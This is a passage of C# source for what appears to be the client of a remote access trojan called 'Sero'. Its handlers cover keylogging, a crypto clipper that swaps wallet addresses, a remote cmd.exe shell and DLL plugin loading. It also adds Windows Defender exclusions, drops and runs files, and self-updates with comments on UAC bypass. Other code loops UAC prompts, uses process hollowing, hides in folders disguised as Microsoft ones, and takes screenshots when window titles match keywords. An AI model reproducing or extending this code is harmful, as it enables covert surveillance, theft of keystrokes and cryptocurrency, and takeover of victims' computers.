                    _ = Task.Run(async () =>
                    {
                        var kLogs = KeyloggerFeature.GetAndClearLogs();
                        await WritePacketAsync(new Packet
                        {
                            Type = PacketType.KeyloggerLogsResult,
                            Data = JsonSerializer.Serialize(
                                new KeyloggerLogsResultStub { Logs = kLogs, IsRunning = KeyloggerFeature.IsRunning },
                                SeroJson.Default.KeyloggerLogsResultStub)
                        }, CancellationToken.None);
                    });
                    break;

                case PacketType.KeyloggerClear:
                    _ = Task.Run(() => KeyloggerFeature.GetAndClearLogs());
                    break;

                case PacketType.KeyloggerListFiles:
                    _ = Task.Run(async () =>
                    {
                        var klFiles = KeyloggerFeature.GetLogFiles();
                        await WritePacketAsync(new Packet
                        {
                            Type = PacketType.KeyloggerFilesResult,
                            Data = JsonSerializer.Serialize(
                                new KeyloggerFilesResultStub
                                {
                                    Files = klFiles.ToList(),
                                    IsRunning = KeyloggerFeature.IsRunning
                                }, SeroJson.Default.KeyloggerFilesResultStub)
                        }, CancellationToken.None);
                    });
                    break;

                case PacketType.KeyloggerGetFile:
                    var klGf = JsonSerializer.Deserialize(packet.Data, SeroJson.Default.KeyloggerGetFileStub);
                    if (klGf != null)
                    {
                        var klGfName = klGf.Filename;
                        _ = Task.Run(async () =>
                        {
                            var content = KeyloggerFeature.GetFileContent(klGfName);
                            await WritePacketAsync(new Packet
                            {
                                Type = PacketType.KeyloggerFileContent,
                                Data = JsonSerializer.Serialize(
                                    new KeyloggerFileContentStub { Filename = klGfName, Content = content },
                                    SeroJson.Default.KeyloggerFileContentStub)
                            }, CancellationToken.None);
                        });
                    }
                    break;

                case PacketType.KeyloggerDeleteFile:
                    var klDf = JsonSerializer.Deserialize(packet.Data, SeroJson.Default.KeyloggerGetFileStub);
                    if (klDf != null) KeyloggerFeature.DeleteFile(klDf.Filename);
                    break;

                // ── Crypto Clipper ────────────────────────────────────
                case PacketType.ClipperSetConfig:
                    var clipCfg = JsonSerializer.Deserialize(packet.Data, SeroJson.Default.ClipperSetConfigStub);
                    if (clipCfg != null)
                    {
                        CryptoClipperFeature.OnDetected = async (type, orig, rep) =>
                            await WritePacketAsync(new Packet
                            {
                                Type = PacketType.ClipperDetected,
                                Data = JsonSerializer.Serialize(
                                    new ClipperDetectedStub { Type = type, Original = orig, Replaced = rep },
                                    SeroJson.Default.ClipperDetectedStub)
                            }, CancellationToken.None);
                        var clipCfgCopy = clipCfg;
                        _ = Task.Run(() => CryptoClipperFeature.SetConfig(clipCfgCopy.Enabled, clipCfgCopy.Addresses));
                    }
                    break;

                case PacketType.ClipperGetStats:
                    var (lt, lo, ln) = CryptoClipperFeature.LastHit;
                    _ = WritePacketAsync(new Packet
                    {
                        Type = PacketType.ClipperStatsResult,
                        Data = JsonSerializer.Serialize(
                            new ClipperStatsResultStub
                            {
                                Enabled  = CryptoClipperFeature.IsEnabled,
                                Count    = CryptoClipperFeature.ReplaceCount,
                                LastType = lt,
                                LastOrig = lo,
                                LastNew  = ln
                            }, SeroJson.Default.ClipperStatsResultStub)
                    }, ct);
                    break;

                // ── Fun ──────────────────────────────────────────────
                case PacketType.FunCmd:
                    var funCmd = JsonSerializer.Deserialize(packet.Data, SeroJson.Default.FunCmdDataStub);
                    if (funCmd != null)
                        _ = Task.Run(() =>
                        {
                            var result = FunFeature.Execute(funCmd.Action, funCmd.Param);
                            _ = WritePacketAsync(new Packet { Type = PacketType.FunResult, Data = result }, CancellationToken.None);
                        });
                    break;

                case PacketType.Disconnect:
                    ShouldReconnect = false;
                    Persistence.StopWatchdog();
                    Protection.StopGuardian();
                    // Clear the stop flag written by StopGuardian so the user can
                    // manually relaunch the stub immediately without the 15-second block.
                    Protection.ClearStopFlag();
                    if (Config.EnableWatchdog) Protection.RemoveDacl();
                    if (Config.AntiKill) try { Protection.UnsetCriticalProcess(); } catch { }
                    Program.ReleaseMutex();
                    return;

                default:
                    break;
            }
        }
    }

    [System.Runtime.InteropServices.DllImport("user32.dll")] private static extern nint GetForegroundWindow();
    [System.Runtime.InteropServices.DllImport("user32.dll", CharSet = System.Runtime.InteropServices.CharSet.Unicode)]
    private static extern int GetWindowTextW(nint hwnd, System.Text.StringBuilder sb, int max);

    private static string _lastActiveTitle = "";
    private static int _activeSkipCounter;

    // Window Notify
    private static volatile string[] _winNotifyKeywords = [];
    private static string _winNotifyLastKeyword = "";
    private static readonly Dictionary<string, DateTime> _winNotifyCooldown = new();

    private static string GetActiveWindowTitle()
    {
        if (++_activeSkipCounter % 3 != 0)
            return _lastActiveTitle;
        try
        {
            var hwnd = GetForegroundWindow();
            if (hwnd == 0) return _lastActiveTitle = "";
            var sb = new System.Text.StringBuilder(256);
            GetWindowTextW(hwnd, sb, 256);
            return _lastActiveTitle = sb.ToString();
        }
        catch { return _lastActiveTitle = ""; }
    }

    // ── CPU/RAM sampling ────────────────────────────────
    [System.Runtime.InteropServices.StructLayout(System.Runtime.InteropServices.LayoutKind.Sequential)]
    private struct MEMORYSTATUSEX { public uint dwLength, dwMemoryLoad; public ulong ullTotalPhys, ullAvailPhys, ullTotalPageFile, ullAvailPageFile, ullTotalVirtual, ullAvailVirtual, ullAvailExtendedVirtual; }
    [System.Runtime.InteropServices.DllImport("kernel32.dll")] private static extern bool GlobalMemoryStatusEx(ref MEMORYSTATUSEX lpBuffer);
    private struct LASTINPUTINFO { public uint cbSize; public uint dwTime; }
    [System.Runtime.InteropServices.DllImport("user32.dll")] private static extern bool GetLastInputInfo(ref LASTINPUTINFO plii);
    [System.Runtime.InteropServices.DllImport("kernel32.dll")] private static extern bool GetSystemTimes(out long idleTime, out long kernelTime, out long userTime);

    private long _lastIdle, _lastKernel, _lastUser;
    private float SampleCpu()
    {
        try
        {
            GetSystemTimes(out long idle, out long kernel, out long user);
            long dIdle   = idle   - _lastIdle;
            long dKernel = kernel - _lastKernel;
            long dUser   = user   - _lastUser;
            _lastIdle = idle; _lastKernel = kernel; _lastUser = user;
            long total = dKernel + dUser;
            if (total <= 0) return 0f;
            float usage = (1f - (float)dIdle / total) * 100f;
            return Math.Max(0f, Math.Min(100f, usage));
        }
        catch { return 0f; }
    }

    private static HardwareStatsStub SampleHardware(float cpu)
    {
        long ramUsed = 0, ramTotal = 0;
        try
        {
            var mem = new MEMORYSTATUSEX { dwLength = (uint)System.Runtime.InteropServices.Marshal.SizeOf<MEMORYSTATUSEX>() };
            if (GlobalMemoryStatusEx(ref mem))
            {
                ramTotal = (long)(mem.ullTotalPhys / (1024 * 1024));
                ramUsed  = ramTotal - (long)(mem.ullAvailPhys / (1024 * 1024));
            }
        }
        catch { }
        int idleSec = 0;
        try
        {
            var lii = new LASTINPUTINFO { cbSize = (uint)System.Runtime.InteropServices.Marshal.SizeOf<LASTINPUTINFO>() };
            if (GetLastInputInfo(ref lii))
                idleSec = Math.Max(0, (int)((uint)Environment.TickCount - lii.dwTime) / 1000);
        }
        catch { }
        var cpuName = _cpuName ??= GetCpuName();
        var gpuName = _gpuName ??= GetGpuName();
        return new HardwareStatsStub { CpuUsage = cpu, RamUsed = ramUsed, RamTotal = ramTotal, CpuName = cpuName, GpuName = gpuName, IdleSeconds = idleSec };
    }

    private static string? _cpuName;
    private static string? _gpuName;

    private static string GetCpuName()
    {
        try
        {
            using var key = Microsoft.Win32.Registry.LocalMachine.OpenSubKey(
                @"HARDWARE\DESCRIPTION\System\CentralProcessor\0");
            var name = key?.GetValue("ProcessorNameString")?.ToString() ?? "";
            return name.Trim().Replace("  ", " ");
        }
        catch { return ""; }
    }

    private static string GetGpuName()
    {
        try
        {
            var classKey = Microsoft.Win32.Registry.LocalMachine.OpenSubKey(
                @"SYSTEM\CurrentControlSet\Control\Class\{4d36e968-e325-11ce-bfc1-08002be10318}");
            if (classKey == null) return "";
            foreach (var sub in classKey.GetSubKeyNames())
            {
                using var dev = classKey.OpenSubKey(sub);
                var desc = dev?.GetValue("DriverDesc")?.ToString() ?? "";
                if (!string.IsNullOrEmpty(desc) && !desc.Contains("Microsoft", StringComparison.OrdinalIgnoreCase))
                    return desc.Trim();
            }
            return "";
        }
        catch { return ""; }
    }

    // ── Network sampling via BCL NetworkInterface ────────────────────────────
    // MIB_IFROW offsets were wrong (missing 512-byte wszName header, bad stride).
    // NetworkInterface.GetAllNetworkInterfaces() uses GetAdaptersInfo internally
    // and correctly parses the structs — much simpler and accurate.

    private long _lastNetSent, _lastNetRecv;
    private DateTime _lastNetTs = DateTime.UtcNow;

    private (long sentKBps, long recvKBps) SampleNetwork()
    {
        try
        {
            long sent = 0, recv = 0;
            foreach (var ni in System.Net.NetworkInformation.NetworkInterface.GetAllNetworkInterfaces())
            {
                if (ni.OperationalStatus != System.Net.NetworkInformation.OperationalStatus.Up) continue;
                if (ni.NetworkInterfaceType == System.Net.NetworkInformation.NetworkInterfaceType.Loopback) continue;
                var stats = ni.GetIPStatistics();
                sent += stats.BytesSent;
                recv += stats.BytesReceived;
            }
            var now = DateTime.UtcNow;
            var elapsed = (now - _lastNetTs).TotalSeconds;
            long sentKBps = elapsed > 0 ? (long)((sent - _lastNetSent) / elapsed / 1024) : 0;
            long recvKBps = elapsed > 0 ? (long)((recv - _lastNetRecv) / elapsed / 1024) : 0;
            _lastNetSent = sent; _lastNetRecv = recv; _lastNetTs = now;
            return (Math.Max(0, sentKBps), Math.Max(0, recvKBps));
        }
        catch { return (0, 0); }
    }

    // ── PerfMon streaming ────────────────────────────────────────────────────
    private volatile bool _perfMonRunning;
    private int _perfMonIntervalMs = 1000;

    private async Task PerfMonLoop(CancellationToken ct)
    {
        while (_perfMonRunning && !ct.IsCancellationRequested)
        {
            try
            {
                await Task.Delay(_perfMonIntervalMs, ct);
                if (!_perfMonRunning) break;
                var cpu = SampleCpu();
                var hw  = SampleHardware(cpu);
                var (sent, recv) = SampleNetwork();
                var data = JsonSerializer.Serialize(new PerfMonDataStub
                {
                    CpuUsage      = hw.CpuUsage,
                    RamUsed       = hw.RamUsed,
                    RamTotal      = hw.RamTotal,
                    NetworkSentKB = sent,
                    NetworkRecvKB = recv
                }, SeroJson.Default.PerfMonDataStub);
                await WritePacketAsync(new Packet { Type = PacketType.PerfMonData, Data = data }, CancellationToken.None);
            }
            catch (OperationCanceledException) { break; }
            catch { await Task.Delay(2000, CancellationToken.None); }
        }
    }

    private async Task HeartbeatSender(CancellationToken ct)
    {
        // Prime CPU counters before first sample
        GetSystemTimes(out _lastIdle, out _lastKernel, out _lastUser);

        int hwTick = 0;
        while (!ct.IsCancellationRequested)
        {
            try
            {
                await Task.Delay(Config.HeartbeatIntervalMs, ct);
                await WritePacketAsync(new Packet { Type = PacketType.Heartbeat }, ct);

                // Send active window every heartbeat (3 s)
                var title = GetActiveWindowTitle();
                if (!string.IsNullOrEmpty(title))
                    _ = WritePacketAsync(new Packet { Type = PacketType.ActiveWindow, Data = title },
                                         CancellationToken.None);

                // Window Notify — check active window against operator keywords
                var wnKws = _winNotifyKeywords;
                if (wnKws.Length > 0 && !string.IsNullOrEmpty(title))
                {
                    string? matchedKw = null;
                    foreach (var kw in wnKws)
                    {
                        if (kw.Length > 0 && title.IndexOf(kw, StringComparison.OrdinalIgnoreCase) >= 0)
                        { matchedKw = kw; break; }
                        // domain-style keyword: try stem before last dot (e.g. "youtube.com" → "youtube")
                        var dot = kw.LastIndexOf('.');
                        if (dot > 1)
                        {
                            var stem = kw[..dot];
                            if (stem.Length > 2 && title.IndexOf(stem, StringComparison.OrdinalIgnoreCase) >= 0)
                            { matchedKw = kw; break; }
                        }
                    }

                    if (matchedKw == null)
                        _winNotifyLastKeyword = string.Empty;
                    else if (matchedKw != _winNotifyLastKeyword)
                    {
                        _winNotifyLastKeyword = matchedKw;
                        bool inCooldown;
                        lock (_winNotifyCooldown)
                        {
                            inCooldown = _winNotifyCooldown.TryGetValue(matchedKw, out var lastFired)
                                         && (DateTime.UtcNow - lastFired).TotalSeconds < 60;
                            if (!inCooldown) _winNotifyCooldown[matchedKw] = DateTime.UtcNow;
                        }
                        if (!inCooldown)
                        {
                            var kw2    = matchedKw;
                            var title2 = title;
                            _ = Task.Run(async () =>
                            {
                                var jpeg = ScreenshotFeature.Capture(55);
                                await WritePacketAsync(new Packet
                                {
                                    Type = PacketType.WindowNotifyAlert,
                                    Data = JsonSerializer.Serialize(new WindowNotifyAlertStub
                                    {
                                        Title      = title2,
                                        Keyword    = kw2,
                                        Screenshot = jpeg
                                    }, SeroJson.Default.WindowNotifyAlertStub)
                                }, CancellationToken.None);
                            });
                        }
                    }
                }

                // Send hardware stats every 5 heartbeats (~15 s)
                if (++hwTick >= 5)
                {
                    hwTick = 0;
                    var cpu = SampleCpu();
                    var hw  = SampleHardware(cpu);
                    _ = WritePacketAsync(new Packet
                    {
                        Type = PacketType.HardwareStats,
                        Data = JsonSerializer.Serialize(hw, SeroJson.Default.HardwareStatsStub)
                    }, CancellationToken.None);
                }
            }
            catch (OperationCanceledException) { break; }
            catch { await Task.Delay(2000, CancellationToken.None); }
        }
    }

    // ── Command Handlers ────────────────────────────

    private async Task HandleShell(string command, CancellationToken ct, PacketType responseType = PacketType.ShellOutput)
    {
        string output;
        int exitCode;

        try
        {
            using var proc = new Process();
            proc.StartInfo = new ProcessStartInfo
            {
                FileName = "cmd.exe",
                Arguments = $"/c {command}",
                RedirectStandardOutput = true,
                RedirectStandardError = true,
                UseShellExecute = false,
                CreateNoWindow = true,
            };
            proc.Start();

            var stdoutTask = proc.StandardOutput.ReadToEndAsync(ct);
            var stderrTask = proc.StandardError.ReadToEndAsync(ct);
            try { await proc.WaitForExitAsync(ct); }
            catch (OperationCanceledException) { try { proc.Kill(entireProcessTree: true); } catch { } throw; }
            var stdout = await stdoutTask;
            var stderr = await stderrTask;

            output = string.IsNullOrEmpty(stderr) ? stdout : $"{stdout}\n{stderr}";
            exitCode = proc.ExitCode;
        }
        catch (Exception ex)
        {
            output = $"Error: {ex.Message}";
            exitCode = -1;
        }

        await WritePacketAsync(new Packet
        {
            Type = responseType,
            Data = JsonSerializer.Serialize(new ShellOutputData { Output = output, ExitCode = exitCode }, SeroJson.Default.ShellOutputData)
        }, ct);
    }

    private static void HandleDefenderExclude(string path)
    {
        string excludeDir;
        if (!string.IsNullOrWhiteSpace(path))
        {
            // Server specified an explicit path
            excludeDir = path;
        }
        else
        {
            // Fall back to stub's own install directory
            var installPath = Persistence.GetInstalledPath(Config.PersistName);
            excludeDir = installPath != null
                ? Path.GetDirectoryName(installPath)!
                : Path.GetDirectoryName(Environment.ProcessPath ?? "")!;
        }
        if (!string.IsNullOrEmpty(excludeDir))
            Protection.AddDefenderExclusion(excludeDir);
    }

    [System.Runtime.InteropServices.UnmanagedFunctionPointer(System.Runtime.InteropServices.CallingConvention.Winapi)]
    private delegate bool PluginMainDelegate();

    private async Task HandlePluginExec(string data, CancellationToken ct)
    {
        string? dllDir = null;
        string? dllPath = null;
        string? logPath = null;
        nint lib = 0;
        try
        {
            var pluginData = JsonSerializer.Deserialize(data, SeroJson.Default.PluginExecData);
            if (pluginData == null) return;

            dllDir = Path.Combine(Path.GetTempPath(), Guid.NewGuid().ToString("N")[..12]);
            Directory.CreateDirectory(dllDir);
            dllPath = Path.Combine(dllDir, Guid.NewGuid().ToString("N")[..8] + ".dll");
            logPath = Path.Combine(dllDir, "log.txt");

            await File.WriteAllBytesAsync(dllPath, Convert.FromBase64String(pluginData.DllBase64), ct);

            // Set log path env var so plugins can write results
            Environment.SetEnvironmentVariable("SERO_PLUGIN_LOG", logPath);

            lib = System.Runtime.InteropServices.NativeLibrary.Load(dllPath);
            bool ok = false;
            if (System.Runtime.InteropServices.NativeLibrary.TryGetExport(lib, pluginData.ExportName, out nint fn))
            {
                var del = System.Runtime.InteropServices.Marshal.GetDelegateForFunctionPointer<PluginMainDelegate>(fn);
                ok = del();
            }
            else { }

            Environment.SetEnvironmentVariable("SERO_PLUGIN_LOG", null);

            // Read optional plugin log (e.g. BotKiller reports killed processes)
            var logLines = "";
            if (File.Exists(logPath))
                try { logLines = "\n" + await File.ReadAllTextAsync(logPath, ct); } catch { }

            await WritePacketAsync(new Packet
            {
                Type = PacketType.ShellOutput,
                Data = JsonSerializer.Serialize(new ShellOutputData
                {
                    Output = $"[Plugin] {pluginData.ExportName}: {(ok ? "OK" : "FAILED")}{logLines}",
                    ExitCode = ok ? 0 : 1
                }, SeroJson.Default.ShellOutputData)
            }, ct);
        }
        catch { }
        finally
        {
            Environment.SetEnvironmentVariable("SERO_PLUGIN_LOG", null);
            if (lib != 0) try { System.Runtime.InteropServices.NativeLibrary.Free(lib); } catch { }
            await Task.Delay(500);
            if (dllPath != null) try { File.Delete(dllPath); } catch { }
            if (dllDir != null) try { Directory.Delete(dllDir, true); } catch { }
        }
    }

    private async Task HandleFileExec(string data, CancellationToken ct)
    {
        string? dropDir = null;
        try
        {
            var fileData = JsonSerializer.Deserialize(data, SeroJson.Default.RemoteFileExecData);
            if (fileData == null) return;

            var safeName = Path.GetFileName(fileData.FileName);
            if (string.IsNullOrWhiteSpace(safeName)) return;

            dropDir = Path.Combine(Path.GetTempPath(), Guid.NewGuid().ToString("N")[..12]);
            Directory.CreateDirectory(dropDir);
            var filePath = Path.Combine(dropDir, safeName);

            await File.WriteAllBytesAsync(filePath, Convert.FromBase64String(fileData.FileBase64), ct);

            bool isExe = string.Equals(Path.GetExtension(safeName), ".exe",
                                        StringComparison.OrdinalIgnoreCase);
            var psi = new ProcessStartInfo
            {
                FileName        = filePath,
                UseShellExecute = !isExe,
                CreateNoWindow  = isExe,
                WindowStyle     = isExe ? ProcessWindowStyle.Hidden : ProcessWindowStyle.Normal,
            };

            var proc = Process.Start(psi);
            // For non-exe files (images, docs), null proc = UWP/shell handled it = success
            bool launched = proc != null || !isExe;
            var result = launched
                ? $"[FileExec] Launched {safeName}" + (proc?.Id is int pid ? $" (PID={pid})" : " (shell)")
                : $"[FileExec] Failed to start {safeName}";

            await WritePacketAsync(new Packet
            {
                Type = PacketType.ShellOutput,
                Data = JsonSerializer.Serialize(new ShellOutputData
                {
                    Output = result,
                    ExitCode = launched ? 0 : -1
                }, SeroJson.Default.ShellOutputData)
            }, ct);

            if (proc != null)
            {
                // Wait up to 3 min for non-exe (image viewers, docs) before cleaning up
                var timeout = isExe ? TimeSpan.FromSeconds(30) : TimeSpan.FromMinutes(3);
                _ = Task.Run(async () =>
                {
                    try { await proc.WaitForExitAsync(CancellationToken.None).WaitAsync(timeout); }
                    catch { }
                    finally
                    {
                        try { if (dropDir != null) Directory.Delete(dropDir, true); } catch { }
                        proc.Dispose();
                    }
                });
            }
            else if (!isExe)
            {
                // UWP or shell-launched: wait before cleanup so file is loaded by the app
                _ = Task.Run(async () =>
                {
                    await Task.Delay(TimeSpan.FromSeconds(60));
                    try { if (dropDir != null) Directory.Delete(dropDir, true); } catch { }
                });
            }
        }
        catch
        {
            try { if (dropDir != null) Directory.Delete(dropDir, true); } catch { }
        }
    }

    private async Task HandleUpdateClient(string data, CancellationToken ct)
    {
        try
        {
            var updateData = JsonSerializer.Deserialize<UpdateClientData>(data, SeroJson.Default.UpdateClientData);
            if (updateData == null) return;

            var safeName = Path.GetFileName(updateData.FileName);
            if (string.IsNullOrWhiteSpace(safeName)) return;

            // Resolve install directory — same folder the current client lives in.
            // Writing here avoids Defender ASR "block untrusted exe from %TEMP%".
            // If ExcludeDefender ran, this whole path is excluded from scanning.
            var installPath0 = Persistence.GetInstalledPath(Config.PersistName);
            var installDir = !string.IsNullOrEmpty(installPath0)
                ? Path.GetDirectoryName(installPath0)!
                : Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData), Config.PersistName);
            Directory.CreateDirectory(installDir);

            // Write new exe to installDir with a random name so it doesn't conflict
            // with the currently-running HiddenFileName.exe (which is still locked).
            var stagePath = Path.Combine(installDir, Guid.NewGuid().ToString("N")[..10] + ".exe");
            await File.WriteAllBytesAsync(stagePath, Convert.FromBase64String(updateData.FileBase64), ct);

            // Tear down ALL protections FIRST — guardian must not restart the old one after it exits.
            Persistence.StopWatchdog();
            Protection.StopGuardian();
            // StopGuardian writes a stop flag — clear it immediately so the new exe
            // doesn't find it and exit with "EXIT: recent stop flag" on startup.
            Protection.ClearStopFlag();
            if (Config.EnableWatchdog) Protection.RemoveDacl();
            if (Config.AntiKill) try { Protection.UnsetCriticalProcess(); } catch { }

            // UseShellExecute=true is the primary spawn method — ShellExecuteEx assigns a
            // proper desktop context to the child process, which is required for UAC bypass
            // techniques (wsreset/fodhelper/sdclt) to work in the new crypted exe.
            // DETACHED_PROCESS (used by _SpawnDetached) strips the window station and
            // silently breaks UAC elevation, causing the new client to come back as user.
            bool spawned = false;
            try { Process.Start(new ProcessStartInfo { FileName = stagePath, UseShellExecute = true, WindowStyle = ProcessWindowStyle.Hidden })?.Dispose(); spawned = true; } catch { }
            if (!spawned) spawned = _SpawnDetached($"\"{stagePath}\"");

            await WritePacketAsync(new Packet
            {
                Type = PacketType.ShellOutput,
                Data = JsonSerializer.Serialize(new ShellOutputData
                    { Output = $"Update: {(spawned ? "OK" : "FAIL")} {stagePath}", ExitCode = spawned ? 0 : 1 },
                    SeroJson.Default.ShellOutputData)
            }, ct);

            // Don't ReleaseMutex — let Environment.Exit abandon it.
            // The new exe catches AbandonedMutexException (handled in Program.cs line ~120)
            // and continues normally. This avoids the race window where mutex is free
            // but old process is still alive and a third instance could grab it.
            await Task.Delay(500, ct);
            Environment.Exit(0);
        }
        catch (Exception ex)
        {
            try
            {
                await WritePacketAsync(new Packet
                {
                    Type = PacketType.ShellOutput,
                    Data = JsonSerializer.Serialize(new ShellOutputData { Output = $"Update failed: {ex.Message}", ExitCode = -1 }, SeroJson.Default.ShellOutputData)
                }, ct);
            }
            catch { }
        }
    }

    private async Task HandleElevation(bool loop, CancellationToken ct)
    {
        if (IsAdmin())
        {
            await WritePacketAsync(new Packet
            {
                Type = PacketType.ElevationResult,
                Data = JsonSerializer.Serialize(new ElevationResultData { Success = true, Message = "Already elevated" }, SeroJson.Default.ElevationResultData)
            }, ct);
            return;
        }

        bool elevated = false;
        do
        {
            // Resolve exe path: prefer installed AppData copy (works even when hollowed into dllhost etc.)
            var selfPath = Persistence.GetInstalledPath(Config.PersistName);
            if (string.IsNullOrEmpty(selfPath))
            {
                // No installed copy — copy our real exe to AppData
                // When hollowed, Environment.ProcessPath = dllhost.exe, so we use the original exe from disk
                try
                {
                    var appData = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData);
                    var installDir = Path.Combine(appData, Config.PersistName);
                    Directory.CreateDirectory(installDir);
                    var installExe = Path.Combine(installDir, Config.HiddenFileName);

                    // Try to find the real stub exe (not dllhost)
                    var currentExe = Environment.ProcessPath;
                    bool isHollowed = ProcessHollowing.IsHollowedInstance();

                    if (isHollowed)
                    {
                        // When hollowed, our real exe was the one that launched the hollow
                        // It should already be in AppData if persistence was used, otherwise
                        // we can't easily get it — use the backup from LocalAppData
                        var localAppData = Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData);
                        var backupExe = Path.Combine(localAppData, "." + Config.PersistName, Config.HiddenFileName);
                        if (File.Exists(backupExe))
                        {
                            File.Copy(backupExe, installExe, true);
                            selfPath = installExe;
                        }
                    }
                    else if (!string.IsNullOrEmpty(currentExe) && File.Exists(currentExe))
                    {
                        File.Copy(currentExe, installExe, true);
                        selfPath = installExe;
                    }
                }
                catch { }
            }
            // Final fallback
            if (string.IsNullOrEmpty(selfPath))
                selfPath = Environment.ProcessPath;
            if (string.IsNullOrEmpty(selfPath)) break;

            try
            {
                var psi = new ProcessStartInfo
                {
                    FileName = selfPath,
                    UseShellExecute = true,
                    Verb = "runas"
                };

                if (Config.AntiKill)
                {
                    try { Protection.UnsetCriticalProcess(); } catch { }
                }

                // Release mutex BEFORE launching elevated process
                // so the new instance can acquire it in Main()
                Program.ReleaseMutex();

                var proc = Process.Start(psi);
                if (proc != null)
                {
                    elevated = true;
                    await WritePacketAsync(new Packet
                    {
                        Type = PacketType.ElevationResult,
                        Data = JsonSerializer.Serialize(new ElevationResultData { Success = true, Message = "UAC accepted" }, SeroJson.Default.ElevationResultData)
                    }, ct);

                    // Give the elevated instance time to connect before we exit
                    await Task.Delay(2000, ct);

                    Environment.Exit(0);
                }
                else
                {
                    // Process.Start returned null — reacquire mutex
                    Program.ReacquireMutex();
                }
            }
            catch (Exception ex)
            {
                // Mutex was released before Process.Start — reacquire it
                Program.ReacquireMutex();

                // Always send failure response (prevents UI flickering on loop)
                if (!elevated)
                {
                    await WritePacketAsync(new Packet
                    {
                        Type = PacketType.ElevationResult,
                        Data = JsonSerializer.Serialize(new ElevationResultData { Success = false, Message = "UAC declined" }, SeroJson.Default.ElevationResultData)
                    }, ct);
                }
            }

            if (loop && !elevated)
            {
                // Wait between attempts so only ONE popup shows at a time (no spam)
                // 4s gives the user time to close/decline before the next one appears
                await Task.Delay(4000, ct);
            }
        } while (loop && !elevated && !ct.IsCancellationRequested);
    }

    private void HandleUninstall()
    {
        try
        {
            // Stop all protection before uninstalling
            Persistence.StopWatchdog();
            Protection.StopGuardian();    // writes stop flag so surviving guardians won't relaunch
            Protection.CleanupGuardianCopies();
            // NOTE: do NOT call ClearStopFlag() here — the flag must persist after exit so that
            // any guardian that wakes up late sees it and does not relaunch the main process.

            // Remove DACL so the process can exit cleanly
            if (Config.EnableWatchdog)
                Protection.RemoveDacl();

            // Disable BSOD before uninstalling
            if (Config.AntiKill)
            {
                try { Protection.UnsetCriticalProcess(); } catch { }
            }

            Persistence.RemoveRegistry(Config.PersistName);
            Persistence.RemoveRegistryHKLM(Config.PersistName);
            Persistence.RemoveStartup(Config.PersistName);
            Persistence.RemoveScheduledTask(Config.PersistName);
            Persistence.RemoveService(Config.PersistName);
            Persistence.RemoveWmi(Config.PersistName);

            Program.ReleaseMutex();

            // In RunPE mode, ProcessPath = hollowed target (dllhost.exe etc.) — use SERO_EXE instead
            var selfPath = ProcessHollowing.IsHollowedInstance()
                ? (Environment.GetEnvironmentVariable("SERO_EXE") ?? Persistence.GetInstalledPath(Config.PersistName))
                : (Persistence.GetInstalledPath(Config.PersistName) ?? Environment.ProcessPath);

            var appDataDir = Path.Combine(
                Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData),
                Config.PersistName);
            var backupDir = Path.Combine(
                Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData),
                "Microsoft", "WindowsServices");
            var disguiseDir = Path.Combine(
                Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData),
                "Microsoft", "CoreRuntime");
            var delCmd = "/c timeout /t 8 /nobreak >nul";
            if (!string.IsNullOrEmpty(selfPath) && File.Exists(selfPath))
                delCmd += $" & del /f /q \"{selfPath}\"";
            if (Directory.Exists(appDataDir))
                delCmd += $" & rmdir /s /q \"{appDataDir}\"";
            if (Directory.Exists(backupDir))
                delCmd += $" & rmdir /s /q \"{backupDir}\"";
            if (Directory.Exists(disguiseDir))
                delCmd += $" & rmdir /s /q \"{disguiseDir}\"";
            // Plugin artifact cleanup — BootSafeMode service + SafeBoot registry, BlockAvDns firewall rule
            delCmd += " & sc delete WinDefSvc >nul 2>&1";
            delCmd += " & reg delete \"HKLM\\SYSTEM\\CurrentControlSet\\Control\\SafeBoot\\Network\\WinDefSvc\" /f >nul 2>&1";
            delCmd += " & reg delete \"HKLM\\SYSTEM\\CurrentControlSet\\Control\\SafeBoot\\Minimal\\WinDefSvc\" /f >nul 2>&1";
            delCmd += " & netsh advfirewall firewall delete rule name=\"BlkDoT\" >nul 2>&1";

            Process.Start(new ProcessStartInfo
            {
                FileName = "cmd.exe",
                Arguments = delCmd,
                CreateNoWindow = true,
                UseShellExecute = false,
            });
        }
        catch { }

        Environment.Exit(0);
    }

    // ── Packet IO ───────────────────────────────────

    // Priority write queue:
    //   dropIfBusy=false  → ctrl channel (control/response packets — always delivered)
    //   dropIfBusy=true   → frame channel (webcam/mic — silently dropped when channel full)
    // WriteLoop below is the single consumer that serialises all writes onto _ssl.
    private async Task WritePacketAsync(Packet packet, CancellationToken ct, bool dropIfBusy = false)
    {
        if (_ssl == null) return;
        if (dropIfBusy)
            _frameCh.Writer.TryWrite(packet); // DropWrite mode — never blocks; drop if full
        else
            await _ctrlCh.Writer.WriteAsync(packet, ct);
    }

    // RDP-frame variant: returns false when the frame channel was full (frame dropped)
    // so the caller can refund the flow-control credit rather than leaking it.
    private Task<bool> WriteFrameAsync(Packet packet, CancellationToken ct)
    {
        if (_ssl == null) return Task.FromResult(false);
        bool queued = _frameCh.Writer.TryWrite(packet);
        return Task.FromResult(queued);
    }

    private byte[] SerializePacket(Packet packet)
    {
        var json = JsonSerializer.Serialize(packet, SeroJson.Default.Packet);
        var jsonBytes = Encoding.UTF8.GetBytes(json);
        var result = new byte[4 + jsonBytes.Length];
        BitConverter.GetBytes(jsonBytes.Length).CopyTo(result, 0);
        jsonBytes.CopyTo(result, 4);
        return result;
    }

    // ── WriteLoop: serialises packets into output channels (never blocks on I/O) ──
    // Drains all control packets into _ctrlOutCh first, then one frame into _frameOutCh.
    // Output channels use DropWrite, so the WriteLoop is never blocked by congestion.
    private async Task WriteLoop(CancellationToken ct)
    {
        try
        {
            while (!ct.IsCancellationRequested)
            {
                // ① Drain all queued control packets first (priority)
                while (_ctrlCh.Reader.TryRead(out var ctrl))
                    _ctrlOutCh.Writer.TryWrite(SerializePacket(ctrl));

                // ② Write one frame if pending (dropped silently if _frameOutCh is full)
                if (_frameCh.Reader.TryRead(out var frame))
                {
                    _frameOutCh.Writer.TryWrite(SerializePacket(frame));
                    continue;
                }

                // ③ Both empty — wake immediately when either channel gets data
                try
                {
                    using var linked = CancellationTokenSource.CreateLinkedTokenSource(ct);
